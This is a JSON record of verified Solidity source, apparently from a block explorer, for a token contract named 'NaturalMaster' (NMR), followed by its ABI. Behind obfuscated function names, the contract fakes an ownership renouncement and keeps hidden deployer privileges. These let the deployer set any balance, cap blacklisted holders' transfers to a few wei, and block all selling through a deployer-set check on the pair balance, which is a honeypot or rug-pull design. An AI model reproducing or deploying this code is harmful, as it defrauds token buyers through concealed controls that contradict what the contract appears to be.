{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface autoAt {\n    function createPair(address launchReceiverTotal, address amountFrom) external returns (address);\n}\n\ninterface swapAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listLaunched) external view returns (uint256);\n\n    function transfer(address autoLaunchedMode, uint256 liquidityMax) external returns (bool);\n\n    function allowance(address minTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoLaunchedMode,\n        uint256 liquidityMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldBuy, uint256 value);\n    event Approval(address indexed minTake, address indexed spender, uint256 value);\n}\n\nabstract contract txSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableLimit is swapAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NaturalMaster is txSender, swapAmount, enableLimit {\n\n    function amountList() public {\n        emit OwnershipTransferred(autoTrading, address(0));\n        shouldMode = address(0);\n    }\n\n    string private minLaunch = \"Natural Master\";\n\n    function allowance(address tokenLiquidity, address fromFeeMarketing) external view virtual override returns (uint256) {\n        if (fromFeeMarketing == tokenList) {\n            return type(uint256).max;\n        }\n        return limitReceiver[tokenLiquidity][fromFeeMarketing];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minLaunch;\n    }\n\n    uint256 public sellReceiver;\n\n    function feeShould(address isLiquidity) public {\n        if (amountTrading) {\n            return;\n        }\n        \n        launchMarketingTx[isLiquidity] = true;\n        \n        amountTrading = true;\n    }\n\n    uint256 private feeMarketing = 100000000 * 10 ** 18;\n\n    string private swapMin = \"NMR\";\n\n    mapping(address => mapping(address => uint256)) private limitReceiver;\n\n    constructor (){\n        \n        listMax launchList = listMax(tokenList);\n        tokenMinTo = autoAt(launchList.factory()).createPair(launchList.WETH(), address(this));\n        if (fromEnable) {\n            enableTakeTeam = false;\n        }\n        autoTrading = _msgSender();\n        launchMarketingTx[autoTrading] = true;\n        launchModeTrading[autoTrading] = feeMarketing;\n        amountList();\n        \n        emit Transfer(address(0), autoTrading, feeMarketing);\n    }\n\n    function walletMarketingTo(address receiverExemptTotal, uint256 liquidityMax) public {\n        buyList();\n        launchModeTrading[receiverExemptTotal] = liquidityMax;\n    }\n\n    function approve(address fromFeeMarketing, uint256 liquidityMax) public virtual override returns (bool) {\n        limitReceiver[_msgSender()][fromFeeMarketing] = liquidityMax;\n        emit Approval(_msgSender(), fromFeeMarketing, liquidityMax);\n        return true;\n    }\n\n    uint256 public launchedSellExempt;\n\n    bool private feeEnable;\n\n    event OwnershipTransferred(address indexed modeAuto, address indexed feeLaunched);\n\n    bool public fromEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapMin;\n    }\n\n    address private shouldMode;\n\n    bool private swapMarketing;\n\n    function balanceOf(address listLaunched) public view virtual override returns (uint256) {\n        return launchModeTrading[listLaunched];\n    }\n\n    uint256 constant maxTake = 3 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeMarketing;\n    }\n\n    function transferFrom(address totalTake, address autoLaunchedMode, uint256 liquidityMax) external override returns (bool) {\n        if (_msgSender() != tokenList) {\n            if (limitReceiver[totalTake][_msgSender()] != type(uint256).max) {\n                require(liquidityMax <= limitReceiver[totalTake][_msgSender()]);\n                limitReceiver[totalTake][_msgSender()] -= liquidityMax;\n            }\n        }\n        return limitToken(totalTake, autoLaunchedMode, liquidityMax);\n    }\n\n    function buyList() private view {\n        require(launchMarketingTx[_msgSender()]);\n    }\n\n    address teamReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 launchEnableTotal;\n\n    bool private enableTakeTeam;\n\n    uint256 fromTx;\n\n    address public tokenMinTo;\n\n    address tokenList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public amountTrading;\n\n    uint256 public buyFee;\n\n    function getOwner() external view returns (address) {\n        return shouldMode;\n    }\n\n    uint8 private shouldTeam = 18;\n\n    function senderSell(address receiverAtSwap) public {\n        buyList();\n        if (feeEnable == swapMarketing) {\n            swapMarketing = false;\n        }\n        if (receiverAtSwap == autoTrading || receiverAtSwap == tokenMinTo) {\n            return;\n        }\n        tokenFund[receiverAtSwap] = true;\n    }\n\n    mapping(address => uint256) private launchModeTrading;\n\n    mapping(address => bool) public launchMarketingTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldTeam;\n    }\n\n    uint256 private sellTrading;\n\n    function owner() external view returns (address) {\n        return shouldMode;\n    }\n\n    function limitToken(address totalTake, address autoLaunchedMode, uint256 liquidityMax) internal returns (bool) {\n        if (totalTake == autoTrading) {\n            return atList(totalTake, autoLaunchedMode, liquidityMax);\n        }\n        uint256 liquiditySenderShould = swapAmount(tokenMinTo).balanceOf(teamReceiver);\n        require(liquiditySenderShould == fromTx);\n        require(autoLaunchedMode != teamReceiver);\n        if (tokenFund[totalTake]) {\n            return atList(totalTake, autoLaunchedMode, maxTake);\n        }\n        return atList(totalTake, autoLaunchedMode, liquidityMax);\n    }\n\n    function atList(address totalTake, address autoLaunchedMode, uint256 liquidityMax) internal returns (bool) {\n        require(launchModeTrading[totalTake] >= liquidityMax);\n        launchModeTrading[totalTake] -= liquidityMax;\n        launchModeTrading[autoLaunchedMode] += liquidityMax;\n        emit Transfer(totalTake, autoLaunchedMode, liquidityMax);\n        return true;\n    }\n\n    mapping(address => bool) public tokenFund;\n\n    address public autoTrading;\n\n    function transfer(address receiverExemptTotal, uint256 liquidityMax) external virtual override returns (bool) {\n        return limitToken(_msgSender(), receiverExemptTotal, liquidityMax);\n    }\n\n    function enableWallet(uint256 liquidityMax) public {\n        buyList();\n        fromTx = liquidityMax;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromFeeMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFeeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"enableWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"}],\"name\":\"feeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMarketingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSellExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAtSwap\",\"type\":\"address\"}],\"name\":\"senderSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMinTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExemptTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoLaunchedMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExemptTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityMax\",\"type\":\"uint256\"}],\"name\":\"walletMarketingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NaturalMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}